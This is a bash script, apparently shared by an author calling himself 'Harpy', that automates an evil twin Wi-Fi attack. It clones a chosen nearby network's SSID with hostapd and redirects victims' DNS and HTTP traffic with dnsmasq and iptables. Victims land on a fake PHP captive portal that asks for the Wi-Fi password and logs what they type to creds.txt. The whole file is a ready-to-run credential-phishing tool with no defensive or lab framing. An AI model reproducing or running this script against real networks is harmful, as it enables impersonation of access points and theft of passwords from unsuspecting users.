#!/bin/bash
# -----------------------------
# Evil Twin Attack Automator
# by Harpy 🦅
# -----------------------------

clear
echo -e "\e[1;31m[+] Evil Twin Attack Script by Harpy 🦅\e[0m\n"

# 1. Check Root
if [ "$EUID" -ne 0 ]; then
  echo "[!] Please run this script as root!"
  exit
fi

# 2. Show available wireless interfaces
echo "[*] Available wireless interfaces:"
interfaces=$(iw dev | grep Interface | awk '{print $2}')
select iface in $interfaces; do
  if [ -n "$iface" ]; then
    echo "[+] Selected interface: $iface"
    break
  fi
done

# 3. Scan for nearby Wi-Fi networks
echo "[*] Scanning for Wi-Fi networks..."
iwlist $iface scan | grep 'ESSID' | awk -F '"' '{print NR ". " $2}'
echo
read -p "[+] Enter the number of target SSID: " target_num
target_ssid=$(iwlist $iface scan | grep 'ESSID' | awk -F '"' '{print $2}' | sed -n "${target_num}p")
echo "[+] Target selected: $target_ssid"

# 4. Stop conflicting services
systemctl stop NetworkManager
systemctl stop wpa_supplicant

# 5. Configure IP for interface
ip addr flush dev $iface
ip addr add 192.168.1.1/24 dev $iface

# 6. Create hostapd.conf
cat > /etc/hostapd/hostapd.conf <<EOF
interface=$iface
driver=nl80211
ssid=$target_ssid
hw_mode=g
channel=6
auth_algs=1
ignore_broadcast_ssid=0
EOF

# 7. Create dnsmasq.conf
cat > /etc/dnsmasq.conf <<EOF
interface=$iface
dhcp-range=192.168.1.10,192.168.1.50,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1
EOF

# 8. Enable IP Forwarding and NAT
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables -t nat --flush
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i eth0 -o $iface -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i $iface -o eth0 -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1

# 9. Set up Captive Portal
mkdir -p /var/www/html/
cat > /var/www/html/index.php <<EOF
<?php
if(isset(\$_POST['password'])) {
    file_put_contents('creds.txt', \$_POST['password']."\\n", FILE_APPEND);
}
?>
<html>
<body>
<h2>Wi-Fi Authentication Required</h2>
<p>Please enter the Wi-Fi password to continue:</p>
<form method="POST">
<input type="password" name="password" placeholder="Wi-Fi Password"><br><br>
<input type="submit" value="Connect">
</form>
</body>
</html>
EOF

# Start Apache
systemctl start apache2

# 10. Launch services
echo "[*] Starting Evil Twin Access Point..."
hostapd /etc/hostapd/hostapd.conf &
sleep 3
echo "[*] Starting DHCP server..."
dnsmasq -C /etc/dnsmasq.conf -d &
echo "[+] Evil Twin attack is active!"
echo "[+] Captured credentials will be saved in /var/www/html/creds.txt"
